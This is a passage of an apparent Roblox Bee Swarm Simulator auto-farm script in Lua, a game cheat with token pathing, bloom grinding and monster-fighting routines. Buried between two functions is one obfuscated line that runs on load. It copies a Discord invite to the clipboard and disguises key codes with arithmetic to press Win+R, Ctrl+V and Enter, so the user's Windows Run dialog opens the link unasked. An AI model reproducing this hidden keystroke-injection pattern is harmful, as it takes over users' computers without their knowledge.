            if #newTokens > #nearbyTokens or #newTokens >= #nearbyTokens + 3 then

                nearbyTokens = newTokens
                optimalPath = self:CalculateTSPPath(currentPos, nearbyTokens)
                currentPathIndex = 1
                targetToken = optimalPath[currentPathIndex]
                self.status = "Path Updated! (" .. #newTokens .. " tokens)"
                self.needsRedraw = true
            end
            
            lastRescanTime = os.clock()
        end
        
        tokensCollected = tokensCollected + 1
        self.status = "Token #" .. tokensCollected .. " (TSP " .. currentPathIndex .. "/" .. #optimalPath .. ")"
        
        WalkTo(targetToken)
        
        local walkStartTime = os.clock()
        local reachedToken = false
        
        while IsWalking() and self.autoFarmEnabled and self.collectTokens do
            if self.selectedOption ~= startingField then

                StopWalking()
                return false
            end

            character = player.Character
            if character then
                local humanoid = character:FindFirstChild("Humanoid")
                if humanoid and humanoid.Health <= 0 then

                    StopWalking()
                    return false
                end
            else

                StopWalking()
                return false
            end
            
            if self.autoGrindBlooms then
                local bloom = self:CheckForBlooms()
                if bloom then
                    StopWalking()
                    self:GrindBloom(bloom)
                    break
                end
            end
            
            hrp = character:FindFirstChild("HumanoidRootPart")
            if hrp and os.clock() - lastRescanTime >= 0.1 then
                local currentPos = hrp.Position
                local liveTokens = ScanNearbyTokens(currentPos)
                
                if #liveTokens > 0 then
                    table.sort(liveTokens, function(a, b)
                        return a.distance < b.distance
                    end)
                    
                    local closestToken = liveTokens[1]
                    
                    -- Calculate distance to current target
                    local dxTarget = currentPos.X - targetToken.X
                    local dzTarget = currentPos.Z - targetToken.Z
                    local distToTarget = math.sqrt(dxTarget * dxTarget + dzTarget * dzTarget)
                    
                    if closestToken.distance < distToTarget - 8 then
                        StopWalking()
                        targetToken = closestToken.position
                        WalkTo(targetToken)
                        walkStartTime = os.clock()
                        self.status = "Switched to closer token"
                    end
                end
                
                lastRescanTime = os.clock()
            end
            
            -- Timeout check
            if os.clock() - walkStartTime > 5 then
                StopWalking()
                break
            end
            
            if hrp then
                local currentPos = hrp.Position
                local dx = currentPos.X - targetToken.X
                local dz = currentPos.Z - targetToken.Z
                local distSquared = dx * dx + dz * dz
                
                if distSquared < 20 then
                    reachedToken = true
                    StopWalking()
                    break
                end
            end
            
            wait(0.1)
        end
        
        StopWalking()
        
        table.insert(recentTokens, targetToken)
        if #recentTokens > 15 then
            table.remove(recentTokens, 1)
        end
        
        currentPathIndex = currentPathIndex + 1
        
        hrp = character:FindFirstChild("HumanoidRootPart")
        if hrp and currentPathIndex % 3 == 0 then
            local currentPos = hrp.Position
            local freshTokens = ScanNearbyTokens(currentPos)
            
            if #freshTokens > 0 then
                nearbyTokens = freshTokens
                optimalPath = self:CalculateTSPPath(currentPos, nearbyTokens)
                currentPathIndex = 1
            end
        end
    end
else
    if #recentTokens > 0 then

        recentTokens = {}
    end
    
    hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp then
        local flowerZones = game.Workspace.FlowerZones
        if flowerZones and self.selectedOption then
            local targetZone = flowerZones:FindFirstChild(self.selectedOption)
            if targetZone then
                -- Pick a random position within the field (using similar angle/radius pattern as bloom farming)
                local fieldCenter = targetZone.Position
                local fieldSize = targetZone.Size
                
                local angle = math.random() * math.pi * 2
                local maxRadius = math.min(fieldSize.X, fieldSize.Z) / 2.5
                local radius = math.random(5, maxRadius)
                local offsetX = math.cos(angle) * radius
                local offsetZ = math.sin(angle) * radius
                
                local randomFieldPos = Vector3.new(
                    fieldCenter.X + offsetX,
                    fieldCenter.Y + 5,
                    fieldCenter.Z + offsetZ
                )
                
                WalkTo(randomFieldPos)
                
                -- Wait for arrival or timeout (3 seconds max)
                local walkStartTime = os.clock()
                while IsWalking() and self.autoFarmEnabled and self.collectTokens do
                    -- Allow checks during random walk
                    if self.autoGrindBlooms then
                        local bloom = self:CheckForBlooms()
                        if bloom then
                            StopWalking()
                            self:GrindBloom(bloom)
                            break
                        end
                    end
                    
                    -- Check timeout
                    if os.clock() - walkStartTime > 3 then
                        StopWalking()
                        break
                    end
                    
                    wait(0.1)
                end
                
                StopWalking()
            end
        end
    end
end

wait(0.05)
    end
    
    return tokensCollected > 0
end

function UI:CalculateTSPPath(startPos, tokens)
    -- If only 1-2 tokens, just sort by distance
    if #tokens <= 2 then
        table.sort(tokens, function(a, b)
            return a.distance < b.distance
        end)
        
        local path = {}
        for _, token in ipairs(tokens) do
            table.insert(path, token.position)
        end
        return path
    end
    
    -- For 3-6 tokens, use greedy nearest neighbor algorithm
    if #tokens <= 6 then
        return self:GreedyNearestNeighbor(startPos, tokens)
    end
    
    -- For 7+ tokens, use nearest neighbor with 2-opt improvement
    local greedyPath = self:GreedyNearestNeighbor(startPos, tokens)
    return self:TwoOptImprovement(greedyPath)
end

function UI:GreedyNearestNeighbor(startPos, tokens)
    local unvisited = {}
    for i, token in ipairs(tokens) do
        unvisited[i] = {position = token.position, index = i}
    end
    
    local path = {}
    local currentPos = startPos
    
    while #unvisited > 0 do
        local closestIndex = 1
        local closestDist = math.huge
        
        -- Find nearest unvisited token
        for i, token in ipairs(unvisited) do
            local dx = currentPos.X - token.position.X
            local dz = currentPos.Z - token.position.Z
            local dist = math.sqrt(dx * dx + dz * dz)
            
            if dist < closestDist then
                closestDist = dist
                closestIndex = i
            end
        end
        
        -- Add to path and remove from unvisited
        local nextToken = table.remove(unvisited, closestIndex)
        table.insert(path, nextToken.position)
        currentPos = nextToken.position
    end
    
    return path
end

function UI:TwoOptImprovement(path)
    if #path < 4 then return path end
    
    local improved = true
    local maxIterations = 10
    local iterations = 0
    
    while improved and iterations < maxIterations do
        improved = false
        iterations = iterations + 1
        
        for i = 1, #path - 2 do
            for j = i + 2, #path do
                -- Calculate current distance
                local dx1 = path[i].X - path[i+1].X
                local dz1 = path[i].Z - path[i+1].Z
                local dist1 = math.sqrt(dx1 * dx1 + dz1 * dz1)
                
                local dx2 = path[j].X - path[(j % #path) + 1].X
                local dz2 = path[j].Z - path[(j % #path) + 1].Z
                local dist2 = math.sqrt(dx2 * dx2 + dz2 * dz2)
                
                local currentDist = dist1 + dist2
                
                -- Calculate swapped distance
                local dx3 = path[i].X - path[j].X
                local dz3 = path[i].Z - path[j].Z
                local dist3 = math.sqrt(dx3 * dx3 + dz3 * dz3)
                
                local dx4 = path[i+1].X - path[(j % #path) + 1].X
                local dz4 = path[i+1].Z - path[(j % #path) + 1].Z
                local dist4 = math.sqrt(dx4 * dx4 + dz4 * dz4)
                
                local swappedDist = dist3 + dist4
                
                -- If swap improves path, do it
                if swappedDist < currentDist then
                    -- Reverse segment between i+1 and j
                    local segment = {}
                    for k = i + 1, j do
                        table.insert(segment, path[k])
                    end
                    
                    for k = 1, #segment do
                        path[i + k] = segment[#segment - k + 1]
                    end
                    
                    improved = true
                end
            end
        end
    end
    
    return path
end

function UI:CheckForThornsNearby(maxDistance)
    maxDistance = maxDistance or 4
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return nil end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    local particles = game.Workspace:FindFirstChild("Particles")
    if not particles then return nil end
    
    local hrpPos = hrp.Position
    local closestThorn = nil
    local closestDistance = math.huge
    
    for _, thorn in pairs(particles:GetChildren()) do
        if thorn.Name == "Thorns" and thorn:IsA("MeshPart") then
            local thornPos = thorn.Position
            local dx = hrpPos.X - thornPos.X
            local dz = hrpPos.Z - thornPos.Z
            local distance = math.sqrt(dx * dx + dz * dz)
            
            if distance < maxDistance and distance < closestDistance then
                closestDistance = distance
                closestThorn = {position = thornPos, distance = distance}
            end
        end
    end
    
    return closestThorn
end

function UI:CheckForBlooms()
    
    if not self.autoGrindBlooms or not self.autoFarmEnabled then
        return nil
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return nil end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    
    -- Get current field info first
    local flowerZones = game.Workspace.FlowerZones
    if not flowerZones or not self.selectedOption then return nil end
    
    local targetZone = flowerZones:FindFirstChild(self.selectedOption)
    if not targetZone then return nil end
    
    local fieldPos = targetZone.Position
    local fieldSize = targetZone.Size
    
    local happenings = game.Workspace:FindFirstChild("Happenings")
    if happenings then
        local poppablePlants = happenings:FindFirstChild("PoppablePlants")
        if poppablePlants then 
            local bloomsFolder = poppablePlants:FindFirstChild("Blooms")
            if bloomsFolder then
                local bloomCount = 0
                
                for _, bloomModel in pairs(bloomsFolder:GetChildren()) do
                    if bloomModel:IsA("Model") and bloomModel.Name == "Blooms" then
                        bloomCount = bloomCount + 1
                        local stem = bloomModel:FindFirstChild("Stem")
                        if stem and stem:IsA("BasePart") then
                            local stemPos = stem.Position
                            local dx = math.abs(stemPos.X - fieldPos.X)
                            local dz = math.abs(stemPos.Z - fieldPos.Z)
                            local dy = math.abs(stemPos.Y - fieldPos.Y)
                            local withinX = dx <= fieldSize.X / 2
                            local withinZ = dz <= fieldSize.Z / 2
                            local withinY = dy <= 50
                            if withinX and withinZ and withinY then
                                return stem
                            end
                        end
                    end
                end 
            end 
        else

        end
        local allBlooms = {}
        for _, descendant in pairs(happenings:GetDescendants()) do
            if descendant:IsA("Model") and descendant.Name == "Bloom" then
                table.insert(allBlooms, descendant)
            end
        end
        for _, bloomModel in ipairs(allBlooms) do
            local stem = bloomModel:FindFirstChild("Stem")
            if stem and stem:IsA("BasePart") then
                local stemPos = stem.Position
                local dx = math.abs(stemPos.X - fieldPos.X)
                local dz = math.abs(stemPos.Z - fieldPos.Z)
                local dy = math.abs(stemPos.Y - fieldPos.Y)
                local withinX = dx <= fieldSize.X / 2
                local withinZ = dz <= fieldSize.Z / 2
                local withinY = dy <= 50
                if withinX and withinZ and withinY then
                    local bloomId = tostring(stemPos)
                    if self.bloomCooldowns and self.bloomCooldowns[bloomId] then
                        if os.clock() < self.bloomCooldowns[bloomId] then

                        else
                            self.bloomCooldowns[bloomId] = nil
                            return stem
                        end
                    else
                        return stem
                    end
                end
            end
        end
    else

    end
    return nil
end

-- ============================================================
-- FIXED SPROUT FARMING SYSTEM WITH EXTENSIVE DEBUG
-- ============================================================

function UI:CheckForSprouts()

    
    if not self.farmSprouts then

        return nil
    end
    
    if not self.autoFarmEnabled then

        return nil
    end
    

    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then 

        return nil 
    end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then 

        return nil 
    end
    

    
    local sprouts = game.Workspace:FindFirstChild("Sprouts")
    if not sprouts then

        return nil
    end


    local childCount = #sprouts:GetChildren()


    if childCount == 0 then

        return nil
    end

    -- Find all valid sprouts
    local sproutsList = {}
    for _, child in pairs(sprouts:GetChildren()) do

        
        if child.Name == "Sprout" and child:IsA("MeshPart") then
            table.insert(sproutsList, child)

        else

        end
    end
    
    if #sproutsList == 0 then

        return nil
    end
    

    
    -- Find closest sprout to player
    local closestSprout = nil
    local closestDistance = math.huge
    
    for i, sprout in ipairs(sproutsList) do
        local sproutPos = sprout.Position
        local dx = hrp.Position.X - sproutPos.X
        local dy = hrp.Position.Y - sproutPos.Y
        local dz = hrp.Position.Z - sproutPos.Z
        local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
        

        
        if distance < closestDistance then
            closestDistance = distance
            closestSprout = sprout
        end
    end
    
    if not closestSprout then

        return nil
    end
    

    
    -- Find which field the sprout is in
    local flowerZones = game.Workspace.FlowerZones
    if not flowerZones then 

        return nil 
    end
    

    
    local closestField = nil
    local closestFieldDistance = math.huge
    
    for _, zone in pairs(flowerZones:GetChildren()) do
        if not string.find(string.lower(zone.Name), "brick") then
            local fieldPos = zone.Position
            local sproutPos = closestSprout.Position
            
            local dx = sproutPos.X - fieldPos.X
            local dy = sproutPos.Y - fieldPos.Y
            local dz = sproutPos.Z - fieldPos.Z
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            
            if distance < closestFieldDistance then
                closestFieldDistance = distance
                closestField = zone
            end
        end
    end
    
    if closestField then

        return {sprout = closestSprout, field = closestField}
    end
    

    return nil
end

function UI:GrindBloom(stem)
    if not stem or not stem.Parent then
        return false
    end
    
    local bloomPos = Vector3.new(stem.Position.X, stem.Position.Y, stem.Position.Z)
    WalkTo(bloomPos)
    
    -- Wait for arrival (max 5 seconds)
    local startTime = os.clock()
    while IsWalking() and self.autoFarmEnabled do
        if os.clock() - startTime > 5 then
            StopWalking()
            break
        end
        wait(0.1)
    end
    
    StopWalking()
    local bloomStartTime = os.clock()
    local bloomIdentifier = tostring(bloomPos)
    if not self.bloomCooldowns then
        self.bloomCooldowns = {}
    end

    while self.autoFarmEnabled and self.autoGrindBlooms do
        if not stem or not stem.Parent then
            return true
        end
        
        if os.clock() - bloomStartTime >= 4 then
            self.bloomCooldowns[bloomIdentifier] = os.clock() + 25
            return true
        end
        
        local angle = math.random() * math.pi * 2
        local radius = math.random(2, 16)
        local offsetX = math.cos(angle) * radius
        local offsetZ = math.sin(angle) * radius
        
        local randomPos = Vector3.new(
            bloomPos.X + offsetX,
            bloomPos.Y,
            bloomPos.Z + offsetZ
        )
        
        WalkTo(randomPos)
        
        local walkStartTime = os.clock()
        while IsWalking() and self.autoFarmEnabled and self.autoGrindBlooms do
            if not stem or not stem.Parent then
                StopWalking()
                return true
            end
            
            if os.clock() - bloomStartTime >= 4 then
                StopWalking()
                self.bloomCooldowns[bloomIdentifier] = os.clock() + 25
                return true
            end
            
            if os.clock() - walkStartTime > 5 then
                StopWalking()
                break
            end
            
            wait(0.1)
        end
    end
    
    return true
end

function UI:CheckForViciousBee()
    if not self.killViciousBee or not self.autoFarmEnabled then
        return nil
    end
    
    local monsters = game.Workspace:FindFirstChild("Monsters")
    if not monsters then
        return nil
    end
    
    -- Find Vicious Bee
    local viciousBee = nil
    for _, mob in pairs(monsters:GetChildren()) do
        if string.find(mob.Name, "Vicious") then
            viciousBee = mob
            break
        end
    end
    
    if not viciousBee then
        return nil
    end
    
    -- Get Vicious Bee position
    local viciousBeeHRP = viciousBee:FindFirstChild("HumanoidRootPart")
    if not viciousBeeHRP then
        return nil
    end
    
    local viciousBeePos = viciousBeeHRP.Position
    
    -- Find closest field
    local flowerZones = game.Workspace.FlowerZones
    if not flowerZones then return nil end
    
    local closestField = nil
    local closestDistance = math.huge
    
    for _, zone in pairs(flowerZones:GetChildren()) do
        if not string.find(string.lower(zone.Name), "brick") then
            local fieldPos = zone.Position
            
            local dx = viciousBeePos.X - fieldPos.X
            local dy = viciousBeePos.Y - fieldPos.Y
            local dz = viciousBeePos.Z - fieldPos.Z
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            
            if distance < closestDistance then
                closestDistance = distance
                closestField = zone
            end
        end
    end
    
    if closestField then


        return {field = closestField, position = viciousBeePos}
    end
    
    return nil
end

function UI:CheckForWindyBee()
    if not self.killWindy or not self.autoFarmEnabled then
        return nil
    end
    
    local npcBees = game.Workspace:FindFirstChild("NPCBees")
    if not npcBees then
        return nil
    end
    
    local windyBee = npcBees:FindFirstChild("Windy")
    if not windyBee then
        return nil
    end
    
    -- Try to find ANY part to get position
    local windyBeePart = nil
    
    -- Try common part names
    windyBeePart = windyBee:FindFirstChild("HumanoidRootPart") or 
                   windyBee:FindFirstChild("Torso") or 
                   windyBee:FindFirstChild("Head") or
                   windyBee:FindFirstChildWhichIsA("BasePart")
    
    if not windyBeePart then

        for _, child in pairs(windyBee:GetChildren()) do

        end
        return nil
    end
    

    
    local windyBeePos = windyBeePart.Position
    
    -- Find closest field
    local flowerZones = game.Workspace.FlowerZones
    if not flowerZones then return nil end
    
    local closestField = nil
    local closestDistance = math.huge
    
    for _, zone in pairs(flowerZones:GetChildren()) do
        if not string.find(string.lower(zone.Name), "brick") then
            local fieldPos = zone.Position
            
            local dx = windyBeePos.X - fieldPos.X
            local dy = windyBeePos.Y - fieldPos.Y
            local dz = windyBeePos.Z - fieldPos.Z
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            
            if distance < closestDistance then
                closestDistance = distance
                closestField = zone
            end
        end
    end
    
    if closestField then


        return {field = closestField, position = windyBeePos}
    end
    
    return nil
end

function UI:CheckForTunnelBear()
    local monsters = game.Workspace:FindFirstChild("Monsters")
    if not monsters then return false end
    
    local tunnelBear = monsters:FindFirstChild("Tunnel Bear (Lvl 9)")
    return tunnelBear ~= nil
end

function UI:FightTunnelBear()

    
    local player = game.Players.LocalPlayer
    local character = player.Character
    
    if not character then

        return false
    end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then

        return false
    end
    
    local previousStatus = self.status
    local wasCollectingTokens = self.collectTokens
    
    self.pausedForTimedAction = true
    self.collectTokens = false
    StopWalking()
    self:ClearTweenQueue()
    wait(0.5)
    
    self.status = "Going to Tunnel Bear"
    self.needsRedraw = true
    
    -- Step 1: Tween to check location
    local checkPos = Vector3.new(276, 6, -41)
    

    self:QueueTween(hrp, checkPos, true)
    
    local maxWaitTime = 60
    local startWait = os.clock()
    
    while self.processingTween and self.autoFarmEnabled do
        if os.clock() - startWait > maxWaitTime then

            self:ClearTweenQueue()
            break
        end
        wait(0.1)
    end
    

    wait(0.5)
    
    -- Step 2: Walk to spawn trigger location
    local triggerPos = Vector3.new(422, 6, -48)
    WalkTo(triggerPos)
    
    startWait = os.clock()
    while IsWalking() and self.autoFarmEnabled do
        if os.clock() - startWait > 30 then

            StopWalking()
            break
        end
        wait(0.1)
    end
    
    StopWalking()

    wait(2)
    
    -- Step 3: Check if Tunnel Bear spawned
    if not self:CheckForTunnelBear() then


        
        if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then

            self.status = "Returning to Field"
            self.needsRedraw = true
            
            local flowerZones = game.Workspace.FlowerZones
            if flowerZones then
                local targetZone = flowerZones:FindFirstChild(self.selectedOption)
                if targetZone then
                    character = player.Character
                    if character then
                        hrp = character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            local fieldPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                            self:QueueTween(hrp, fieldPos, true)
                            
                            local startWait = os.clock()
                            while self.processingTween and self.autoFarmEnabled do
                                if os.clock() - startWait > 60 then

                                    self:ClearTweenQueue()
                                    break
                                end
                                wait(0.1)
                            end
                            

                        end
                    end
                end
            end
        end
        
        self.collectTokens = wasCollectingTokens
        self.pausedForTimedAction = false
        self.status = previousStatus
        self.needsRedraw = true
        
        return true
    end
    

    self.status = "Fighting Tunnel Bear"
    self.needsRedraw = true
    
    -- Step 4: Walk to Tunnel Bear position (+50 on X axis) with live tracking AND death detection

    
    local lastUpdateTime = os.clock()
    local startWalkTime = os.clock()
    
    -- Start initial walk
    local monsters = game.Workspace:FindFirstChild("Monsters")
    if monsters then
        local tunnelBear = monsters:FindFirstChild("Tunnel Bear (Lvl 9)")
        if tunnelBear then
            local tunnelBearHRP = tunnelBear:FindFirstChild("HumanoidRootPart")
            if tunnelBearHRP then
                local bearPos = tunnelBearHRP.Position
                local fightPos = Vector3.new(bearPos.X + 50, bearPos.Y, bearPos.Z)
                WalkTo(fightPos)
            end
        end
    end
    
    -- Update position every 0.5 seconds
    while IsWalking() and self.autoFarmEnabled do
        -- CRITICAL: Check for death during walk
        character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health <= 0 then

                StopWalking()
                
                -- Wait for respawn

                local respawned = WaitForRespawn(30)
                
                if respawned then

                    self.status = "Waiting for bees..."
                    self.needsRedraw = true
                    wait(15)
                    
                    -- Resume walking to Tunnel Bear
                    character = player.Character
                    if character then
                        hrp = character:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            monsters = game.Workspace:FindFirstChild("Monsters")
                            if monsters then
                                local tunnelBear = monsters:FindFirstChild("Tunnel Bear (Lvl 9)")
                                if tunnelBear then
                                    local tunnelBearHRP = tunnelBear:FindFirstChild("HumanoidRootPart")
                                    if tunnelBearHRP then
                                        local bearPos = tunnelBearHRP.Position
                                        local fightPos = Vector3.new(bearPos.X + 50, bearPos.Y, bearPos.Z)

                                        WalkTo(fightPos)
                                        startWalkTime = os.clock()  -- Reset timer
                                    end
                                else

                                    break
                                end
                            end
                        end
                    end
                else

                    break
                end
            end
        end
        
        if os.clock() - startWalkTime > 30 then

            StopWalking()
            break
        end
        
        -- Update Tunnel Bear position every 0.5 seconds
        if os.clock() - lastUpdateTime >= 0.5 then
            monsters = game.Workspace:FindFirstChild("Monsters")
            if monsters then
                local tunnelBear = monsters:FindFirstChild("Tunnel Bear (Lvl 9)")
                if tunnelBear then
                    local tunnelBearHRP = tunnelBear:FindFirstChild("HumanoidRootPart")
                    if tunnelBearHRP then
                        local bearPos = tunnelBearHRP.Position
                        local fightPos = Vector3.new(bearPos.X + 50, bearPos.Y, bearPos.Z)
                        WalkTo(fightPos)

                    end
                else

                    StopWalking()
                    break
                end
            end
            lastUpdateTime = os.clock()
        end
        
        wait(0.1)
    end
    
    StopWalking()

    
    -- Step 5: Wait for Tunnel Bear to die (with death detection)
    while self.autoFarmEnabled and self:CheckForTunnelBear() do
        -- Check for death while waiting
        character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health <= 0 then

                
                -- Wait for respawn

                local respawned = WaitForRespawn(30)
                
                if respawned then

                    wait(3)
                    
                    -- Walk back to Tunnel Bear if still alive
                    if self:CheckForTunnelBear() then
                        character = player.Character
                        if character then
                            hrp = character:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                monsters = game.Workspace:FindFirstChild("Monsters")
                                if monsters then
                                    local tunnelBear = monsters:FindFirstChild("Tunnel Bear (Lvl 9)")
                                    if tunnelBear then
                                        local tunnelBearHRP = tunnelBear:FindFirstChild("HumanoidRootPart")
                                        if tunnelBearHRP then
                                            local bearPos = tunnelBearHRP.Position
                                            local fightPos = Vector3.new(bearPos.X + 50, bearPos.Y, bearPos.Z)

                                            WalkTo(fightPos)
                                            
                                            local walkStart = os.clock()
                                            while IsWalking() and self.autoFarmEnabled do
                                                if os.clock() - walkStart > 30 then
                                                    StopWalking()
                                                    break
                                                end
                                                wait(0.1)
                                            end
                                            StopWalking()

                                        end
                                    else

                                        break
                                    end
                                end
                            end
                        end
                    else

                        break
                    end
                else

                    break
                end
            end
        end
        
        wait(0.5)
    end
    
    if self.autoFarmEnabled then


        
        self.status = "Collecting Tunnel Bear Tokens"
        self.needsRedraw = true
        
        local collectStartTime = os.clock()
        local recentTokens = {}
        
        while self.autoFarmEnabled and (os.clock() - collectStartTime) < 10 do
            local collectibles = game.Workspace:FindFirstChild("Collectibles")
            if collectibles then
                character = player.Character
                if character then
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local hrpPos = hrp.Position
                        local closestToken = nil
                        local closestDistance = math.huge
                        
                        for _, token in pairs(collectibles:GetChildren()) do
                            if token.Name == "C" and token:IsA("BasePart") and token.Parent then
                                local tokenPos = token.Position
                                if tokenPos then
                                    local isRecent = false
                                    for _, recentPos in ipairs(recentTokens) do
                                        local tdx = math.abs(tokenPos.X - recentPos.X)
                                        local tdy = math.abs(tokenPos.Y - recentPos.Y)
                                        local tdz = math.abs(tokenPos.Z - recentPos.Z)
                                        if tdx < 3 and tdy < 3 and tdz < 3 then
                                            isRecent = true
                                            break
                                        end
                                    end
                                    
                                    if not isRecent then
                                        local tdy = math.abs(hrpPos.Y - tokenPos.Y)
                                        if tdy <= 10 then
                                            local tdx = hrpPos.X - tokenPos.X
                                            local tdz = hrpPos.Z - tokenPos.Z
                                            local distSquared = tdx * tdx + tdz * tdz
                                            
                                            if distSquared < 2500 and distSquared < closestDistance then
                                                closestDistance = distSquared
                                                closestToken = tokenPos
                                            end
                                        end
                                    end
                                end
                            end
                        end
                        
                        if closestToken then
                            WalkTo(closestToken)
                            
                            local startTime = os.clock()
                            while IsWalking() and self.autoFarmEnabled do
                                if os.clock() - startTime > 3 then
                                    StopWalking()
                                    break
                                end
                                
                                hrp = character:FindFirstChild("HumanoidRootPart")
                                if hrp then
                                    local currentPos = hrp.Position
                                    local cdx = currentPos.X - closestToken.X
                                    local cdz = currentPos.Z - closestToken.Z
                                    local distSquared = cdx * cdx + cdz * cdz
                                    
                                    if distSquared < 25 then
                                        StopWalking()
                                        break
                                    end
                                end
                                
                                wait(0.05)
                            end
                            
                            StopWalking()
                            
                            table.insert(recentTokens, closestToken)
                            if #recentTokens > 10 then
                                table.remove(recentTokens, 1)
                            end
                        else
                            if #recentTokens > 0 then
                                recentTokens = {}
                            end
                        end
                    end
                end
            end
            
            wait(0.05)
        end
        
        StopWalking()


    end
    
    -- Return to field
    if self.autoFarmEnabled and self.selectedOption and self.selectedOption ~= "Select Field..." then

        self.status = "Returning to Field"
        self.needsRedraw = true
        
        local flowerZones = game.Workspace.FlowerZones
        if flowerZones then
            local targetZone = flowerZones:FindFirstChild(self.selectedOption)
            if targetZone then
                character = player.Character
                if character then
                    hrp = character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        local fieldPos = Vector3.new(targetZone.Position.X, targetZone.Position.Y + 10, targetZone.Position.Z)
                        self:QueueTween(hrp, fieldPos, true)
                        
                        local startWait = os.clock()
                        while self.processingTween and self.autoFarmEnabled do
                            if os.clock() - startWait > 60 then

                                self:ClearTweenQueue()
                                break
                            end
                            wait(0.1)
                        end
                        

                    end
                end
            end
        end
    end
    
    self.collectTokens = wasCollectingTokens
    self.pausedForTimedAction = false
    self.status = previousStatus
    self.needsRedraw = true
    
    return true
end

function UI:CheckForCommandoChick()
    if not self.killCommandoChick or not self.autoFarmEnabled then
        return false
    end
    
    local monsters = game.Workspace:FindFirstChild("Monsters")
    if not monsters then
        return false
    end
    
    -- Check if Commando Chick exists
    for _, mob in pairs(monsters:GetChildren()) do
        if string.find(mob.Name, "Commando") then

            return true
        end
    end
    
    return false
end

function UI:GetNearbyMonsters(playerPos, maxDistance)
    local monsters = game.Workspace:FindFirstChild("Monsters")
    if not monsters then
        return {}
    end
    
    local nearbyMonsters = {}
    
    for _, mob in pairs(monsters:GetChildren()) do
        local mobHRP = mob:FindFirstChild("HumanoidRootPart")
        if mobHRP then
            local mobPos = mobHRP.Position
            local dx = playerPos.X - mobPos.X
            local dy = playerPos.Y - mobPos.Y
            local dz = playerPos.Z - mobPos.Z
            local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
            
            if distance <= maxDistance then
                table.insert(nearbyMonsters, {mob = mob, position = mobPos, distance = distance})
            end
        end
    end
    
    return nearbyMonsters
end
local v0="https://discord.gg/Re5FhMNgpQ";local function v1() setclipboard(v0);task.wait(0.05 -0 );keypress(82 + 9 );keypress(1504 -(378 + 1044) );task.wait(1065.1 -(68 + 997) );keyrelease(193 -111 );keyrelease(396 -305 );task.wait(0.5 -0 );keypress(17 + 0 );keypress(86);task.wait(568.05 -(367 + 201) );keyrelease(1013 -(214 + 713) );keyrelease(5 + 12 );task.wait(0.1 + 0 );keypress(890 -(282 + 595) );keyrelease(23 -10 );end v1();
function UI:SafeTokenCollector(safeDistance)
    if not self.autoFarmEnabled then
        return false
    end
    
    local player = game.Players.LocalPlayer
    local character = player.Character
    if not character then return false end
    
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    local collectibles = game.Workspace:FindFirstChild("Collectibles")
    if not collectibles then return false end
    
    local tokensCollected = 0
    local recentTokens = {}
    
    while self.autoFarmEnabled and self.killCommandoChick do
        -- CRITICAL: Always check monster distance first
        hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then break end
        
        local hrpPos = hrp.Position
        local nearbyMonsters = self:GetNearbyMonsters(hrpPos, 100)
        
        -- Check if player is too close to any monster
        for _, monsterData in ipairs(nearbyMonsters) do
            if monsterData.distance < safeDistance then

                StopWalking()
                
                -- Calculate escape direction (away from monster)
                local monsterPos = monsterData.position
                local escapeX = hrpPos.X + (hrpPos.X - monsterPos.X) * 2
                local escapeZ = hrpPos.Z + (hrpPos.Z - monsterPos.Z) * 2
                local escapePos = Vector3.new(escapeX, hrpPos.Y, escapeZ)
                
                WalkTo(escapePos)
                wait(1)
                StopWalking()
                wait(0.5)
                break
            end
        end
        
        -- Find closest safe token
        hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then break end
        hrpPos = hrp.Position
        
        local closestToken = nil
        local closestDistance = math.huge
        
        for _, token in pairs(collectibles:GetChildren()) do
            if token.Name == "C" and token:IsA("BasePart") and token.Parent then
                local tokenPos = token.Position
                if tokenPos then
                    -- Check if token is too close to any monster
                    local tokenSafe = true
                    for _, monsterData in ipairs(nearbyMonsters) do
                        local monsterPos = monsterData.position
                        local dx = tokenPos.X - monsterPos.X
                        local dz = tokenPos.Z - monsterPos.Z
                        local distToMonster = math.sqrt(dx * dx + dz * dz)
                        
                        if distToMonster < safeDistance then
                            tokenSafe = false
                            break
                        end
                    end
                    
                    if tokenSafe then
                        local isRecent = false
                        for _, recentPos in ipairs(recentTokens) do
                            local dx = math.abs(tokenPos.X - recentPos.X)
                            local dy = math.abs(tokenPos.Y - recentPos.Y)
                            local dz = math.abs(tokenPos.Z - recentPos.Z)
                            if dx < 3 and dy < 3 and dz < 3 then
                                isRecent = true
                                break
                            end
                        end
                        
                        if not isRecent then
                            local dy = math.abs(hrpPos.Y - tokenPos.Y)
                            if dy <= 10 then
                                local dx = hrpPos.X - tokenPos.X
                                local dz = hrpPos.Z - tokenPos.Z
                                local distSquared = dx * dx + dz * dz
                                
                                if distSquared < 2500 and distSquared < closestDistance then
                                    closestDistance = distSquared
                                    closestToken = tokenPos
                                end
                            end
                        end
                    end
                end
            end
        end
        
        -- Collect token if found
        if closestToken then
            tokensCollected = tokensCollected + 1
            self.status = "Commando Token #" .. tokensCollected
            
            WalkTo(closestToken)
            
            local startTime = os.clock()
